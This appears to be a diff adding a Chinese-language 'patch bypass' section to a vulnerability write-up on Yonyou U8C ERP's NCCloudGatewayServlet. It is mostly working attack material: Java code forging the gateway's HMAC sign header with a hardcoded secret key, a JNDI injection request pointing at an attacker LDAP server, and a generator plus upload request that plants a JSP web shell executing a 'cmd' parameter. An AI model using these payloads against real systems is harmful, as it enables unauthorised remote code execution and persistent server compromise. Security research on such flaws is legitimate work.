@@ -436,3 +436,205 @@ Content-Length: 689
 }
 ```
 
+<h1 id="BivFS">五：补丁绕过</h1>
+
+```
+这里写这个文章的时候已经很晚了，导致我在分析补丁的时候看错了一部分，以为是一个不可访问的地址，实际上这里是可以绕过的，看图一，
+其实就是判断是否180000毫秒以内，并且加密之后在进行base64编码来匹配我们的数据包头sign，这里我写好了绕过代码替换时间戳就行了代码一。
+```
+
+![](https://xinyisleep.github.io/img/2025/U8CERP/19.png)
+
+```java
+<dependency>
+  <groupId>org.apache.commons</groupId>
+  <artifactId>commons-lang3</artifactId>
+  <version>3.12.0</version>
+</dependency>
+<dependency>
+  <groupId>commons-codec</groupId>
+  <artifactId>commons-codec</artifactId>
+  <version>1.15</version>
+</dependency>
+
+import org.apache.commons.codec.binary.Base64;
+import org.apache.commons.lang3.StringUtils;
+
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
+import java.nio.charset.StandardCharsets;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+
+public class HelloServlet{
+    public static void main(String[] args) throws Exception {
+
+        System.out.println(sign("1761664314551"));
+        checkGateWayTokenNew("1761664314551", "UI566klF5IQp3QrL04x1N0BvUk+cxTeYLVKoiDfkzWc=");
+
+    }
+    public static void checkGateWayTokenNew(String ts, String sign) throws Exception {
+        if (!StringUtils.isEmpty(ts) && !StringUtils.isEmpty(sign)) {
+            long tsLong = 0L;
+
+            try {
+                tsLong = Long.parseLong(ts);
+            } catch (Exception var5) {
+                throw new Exception("您没有请求该服务的权限，ts参数异常");
+            }
+
+            if (Math.abs(System.currentTimeMillis() - tsLong) > 180000L) {
+                throw new Exception("您没有请求该服务的权限，参数已过期");
+            } else if (!StringUtils.equals(sign, sign(ts))) {
+                throw new Exception("您没有请求该服务的权限，sign验签失败");
+            }
+        } else {
+            throw new Exception("您没有请求该服务的权限，请重启网关");
+        }
+    }
+    public static String sign(String str) throws NoSuchAlgorithmException, InvalidKeyException {
+        return sign(str, "TJ6RT-3FVCB-DPYP8-XF7QM-96FV3");
+    }
+
+    public static String sign(String str, String secret) throws NoSuchAlgorithmException, InvalidKeyException {
+        Mac mac = Mac.getInstance("HmacSHA256");
+        mac.init(new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), "HmacSHA256"));
+        byte[] signData = mac.doFinal(str.getBytes(StandardCharsets.UTF_8));
+        return new String(Base64.encodeBase64(signData));
+    }
+}
+
+```
+
+```
+那么这里就可以直接打jndi注入了不知道为什么的再往上看一次，payload代码一。
+```
+
+```
+POST /servlet/NCCloudGatewayServlet HTTP/1.1
+Host: 192.168.2.123:8888
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/json
+sign: UI566klF5IQp3QrL04x1N0BvUk+cxTeYLVKoiDfkzWc=
+ts: 1761664314551
+Content-Length: 407
+{
+"serviceInfo": {
+    "serviceMethodArgInfo": [
+      {
+        "argType": {
+          "body": "java.lang.String"
+        },
+        "argValue": {
+          "body": "java.lang.String"
+        },
+        "agg": false,
+        "isArray": false,
+        "isPrimitive": false
+      }
+    ],
+    "serviceClassName": "ldap://192.168.2.136:1099/hhszoi",
+    "serviceMethodName": "exec"
+}
+}
+```
+
+```
+那么这里可以打其他的补丁
+
+[https://security.yonyou.com/#/patchInfo?identifier=565b9cc1214b473dbeb4ab96eeafec08](https://security.yonyou.com/#/patchInfo?identifier=565b9cc1214b473dbeb4ab96eeafec08)
+图一可以看到是可以直接上传文件的extract有一点小小的限制问题不大我直接把脚本写好了代码一，最终payload代码二结束。
+```
+
+![](https://xinyisleep.github.io/img/2025/U8CERP/20.png)
+
+```java
+package com.example.demo1;
+
+import java.io.ByteArrayOutputStream;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipOutputStream;
+
+public class GenerateCompressedZip {
+    public static void main(String[] args) throws Exception {
+        // JSP内容
+        String jspContent = "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>";
+
+        // 创建ZIP，文件名必须是 "compressed"
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        ZipOutputStream zos = new ZipOutputStream(baos);
+
+        ZipEntry entry = new ZipEntry("compressed");
+        zos.putNextEntry(entry);
+        zos.write(jspContent.getBytes());
+        zos.closeEntry();
+        zos.close();
+
+        byte[] aaa = baos.toByteArray();
+
+        // 打印为Java数组格式
+        System.out.print("byte[] aaa = new byte[]{");
+        for (int i = 0; i < aaa.length; i++) {
+            System.out.print(aaa[i]);
+            if (i < aaa.length - 1) {
+                System.out.print(", ");
+            }
+        }
+        System.out.println("};");
+
+        System.out.println("\n总字节数: " + aaa.length);
+        System.out.println("ZIP内文件名: compressed");
+        System.out.println("文件内容: " + jspContent);
+    }
+}
+
+```
+
+```java
+POST /servlet/NCCloudGatewayServlet HTTP/1.1
+Host: 192.168.2.123:8888
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Accept-Language: en-US;q=0.9,en;q=0.8
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
+Connection: close
+Cache-Control: max-age=0
+Content-Type: application/json
+sign: UI566klF5IQp3QrL04x1N0BvUk+cxTeYLVKoiDfkzWc=
+ts: 1761664314551
+Content-Length: 1315
+
+{
+  "serviceInfo": {
+    "serviceMethodArgInfo": [
+      {
+        "argType": {
+          "body": "java.lang.Byte"
+        },
+        "argValue":{"body":[80, 75, 3, 4, 20, 0, 8, 8, 8, 0, 26, 121, 93, 91, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 10, 0, 0, 0, 99, 111, 109, 112, 114, 101, 115, 115, 101, 100, -77, 81, 13, 42, -51, 43, -55, -52, 77, -43, 75, 79, 45, -127, 50, 53, 52, -11, 82, 43, 82, -109, 53, -118, 82, 11, 75, 83, -117, 75, 64, 50, 1, -119, 69, -119, -71, -87, 37, -87, 69, 26, 74, -55, -71, 41, 74, -102, -102, -86, 118, 0, 80, 75, 7, 8, -73, 75, -109, -81, 52, 0, 0, 0, 58, 0, 0, 0, 80, 75, 1, 2, 20, 0, 20, 0, 8, 8, 8, 0, 26, 121, 93, 91, -73, 75, -109, -81, 52, 0, 0, 0, 58, 0, 0, 0, 10, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 99, 111, 109, 112, 114, 101, 115, 115, 101, 100, 80, 75, 5, 6, 0, 0, 0, 0, 1, 0, 1, 0, 56, 0, 0, 0, 108, 0, 0, 0, 0, 0]
+},
+        "agg":"false","isArray":"true","isPrimitive":"true"
+      },
+      {
+        "argType": {
+          "body": "java.lang.String"
+        },
+        "argValue": {
+          "body": "hotwebs/hrss/123.jsp"
+        },
+        "agg": false,
+        "isArray": false,
+        "isPrimitive": false
+      }
+    ],
+    "serviceClassName": "nc.itf.hr.tools.IFileTrans",
+    "serviceMethodName": "uploadFile"
+  }
+}
+
+```
